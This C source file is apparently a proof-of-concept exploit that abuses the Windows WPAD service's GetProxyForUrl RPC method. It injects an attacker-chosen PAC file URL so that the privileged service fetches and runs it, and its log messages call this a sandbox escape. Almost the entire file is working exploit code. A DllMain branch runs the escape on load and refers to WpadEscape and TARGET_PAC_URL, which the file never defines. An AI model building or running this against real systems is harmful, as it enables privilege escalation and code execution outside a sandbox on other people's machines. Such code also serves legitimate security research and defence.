#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

#include "IWinHttpAutoProxySvc_h.h"

#pragma comment(lib, "rpcrt4.lib")

////////
////////
// Global settings
////////

#define EXE_BUILD

////////
////////
// Debug logic
////////

void DebugLog(const wchar_t *Format, ...) {
    va_list Args;
    wchar_t Buffer[10000] = { 0 };
    va_start(Args, Format);
    wvsprintf(Buffer, Format, Args);
    va_end(Args);

    //MessageBoxW(0, Buffer, L"WPAD escape", 0);
    //OutputDebugString(L"\n");
    //wprintf(buffer);
    //wprintf(L"\n");
#ifdef EXE_BUILD
    printf("%ws\r\n", Buffer);
#endif
}

////////
////////
// RPC helpers
////////

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-allocate-function
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { // https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-free-function
    free(ptr);
}


RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
    DWORD Int = 0;
    INT nReply = 0;
    DWORD WinHttpStatusCode = 0;
    LPWSTR Protocol = L"ncalrpc";
    RPC_WSTR StringBinding = NULL;
    RPC_STATUS RpcStatus = RPC_S_OK;
    DWORD dwWaitResult = WAIT_FAILED;
    RPC_BINDING_HANDLE hRpcBinding = NULL;
    HANDLE pNameResTrkRecordHandle = NULL;
    WCHAR AutoConfigUrl[5000] = { 0 };
    wchar_t PacUrlRandom[200] = { 0 };
    RPC_ASYNC_STATE RpcAsyncState = { 0 };
    tagProxyResolveUrl ProxyResolveUrl = { 0 };
    WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
    WINHTTP_SESSION_OPTIONS SessionOptions = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };

    // Make a unique variation of the specified PAC URL to avoid WPAD cache issues

    _snwprintf_s(
        PacUrlRandom,
        ARRAYSIZE(PacUrlRandom),
        ARRAYSIZE(PacUrlRandom),
        L"?%lld",
        __rdtsc()
    );

    wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
    wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);

    DebugLog(L"Target PAC URL: %ws", AutoConfigUrl);

    /*
    This structure contains the URL for which the proxy information
    needs to be resolved.
    */

    ProxyResolveUrl.Url = L"http://www.google.com/";
    ProxyResolveUrl.Domain = L"www.google.com";
    ProxyResolveUrl.Seperator = L"/";
    ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
    ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB

    /*
    This structure holds the flag and the path of Auto Configuration URL.
    This is the URL from where the PAC file needs to be fetched.
    */

    AutoProxyOptions.lpszAutoConfigUrl = AutoConfigUrl;
    AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;

    /*
    The below constants are UNKNOW at the moment.
    This was found by reversing winhttp.dll.
    */

    SessionOptions.dwMaxTimeout = 0xffffffff;
    SessionOptions.dwTimeout1 = 0x0000ea60; // seems like dwTimeout 60000 MS
    SessionOptions.Member2 = 0x00000005;    // maybe drift timeout
    SessionOptions.dwTimeout2 = 0x00007530;
    SessionOptions.dwTimeout3 = 0x00007530;
    SessionOptions.Member5 = 0x00000000;

    /*
    Create the string binding handle.
    */

    RpcStatus = RpcStringBindingComposeW(
        0,
        (RPC_WSTR)Protocol,
        0,
        0,
        0,
        &StringBinding
    );

    if (RpcStatus == RPC_S_OK)
    {
        DebugLog(L"[+] RpcStringBindingCompose successful.");
    }
    else
    {
        DebugLog(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
        return RpcStatus;
    }

    /*
    Get the binding handle from string representation of the handle.
    */

    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding);

    if (RpcStatus == RPC_S_OK)
    {
        DebugLog(L"[+] RpcBindingFromStringBinding successful.");
    }
    else
    {
        DebugLog(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
        return RpcStatus;
    }

    /*
    Initialize RPC_ASYNC_STATE which is going to be used during async operation.
    */

    RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));

    if (RpcStatus == RPC_S_OK)
    {
        DebugLog(L"[+] RpcAsyncInitializeHandle successful.");
    }
    else
    {
        DebugLog(L"[-] RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
        return RpcStatus;
    }

    /*
    RPC run time can notify the client for the occurrence of an event using
    different mechanisms.

    Reference: https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state

    If you do not want to get notified, you can comment the below code.
    */

    RpcAsyncState.UserInfo = NULL;
    RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
    RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);

    if (RpcAsyncState.u.hEvent == NULL)
    {
        DebugLog(L"[-] CreateEvent failed. Error: 0x%X", GetLastError());
        return RpcStatus;
    }

    RpcTryExcept
    {
        /*
        Call the GetProxyForUrl interface method which is responsible for initiating
        the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
        */

        DebugLog(L"[+] Calling GetProxyForUrl RPC method.");

        GetProxyForUrl(
            &RpcAsyncState,
            hRpcBinding,
            &ProxyResolveUrl,
            &AutoProxyOptions,
            &SessionOptions,
            0,
            NULL,
            &Int,
            &ProxyResult,
            &pNameResTrkRecordHandle,
            &WinHttpStatusCode
        );

        DebugLog(L"GetProxyForUrl returned (async)");
    }
        RpcExcept(1)
    {
        DebugLog(L"[-] GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
    }
    RpcEndExcept

    if ((dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000)) == WAIT_OBJECT_0) {
        DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
    }
    else {
        DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
        RpcAsyncCancelCall(&RpcAsyncState, TRUE);
        CloseHandle(RpcAsyncState.u.hEvent);

        return RpcStatus;
    }

    if (RpcAsyncState.u.hEvent != NULL)
    {
        CloseHandle(RpcAsyncState.u.hEvent);
    }

    /*
    Complete the asynchronous RPC call.
    */

    RpcAsyncCompleteCall(&RpcAsyncState, &nReply);

    /*
    Free up the resources.
    */

    RpcStringFreeW(&StringBinding);
    RpcBindingFree(&hRpcBinding);

    DebugLog(L"... WPAD sandbox escape completed. Returning back to original thread...");

    return RpcStatus;
}


#ifdef DLL_BUILD
BOOL APIENTRY DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            WpadEscape(TARGET_PAC_URL);
            Sleep(INFINITE);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
#else

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    if (nArgc < 2) {
        DebugLog(L"... no PAC URL argument provided");
    }
    else {
        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
    }

    return 0;
}
#endif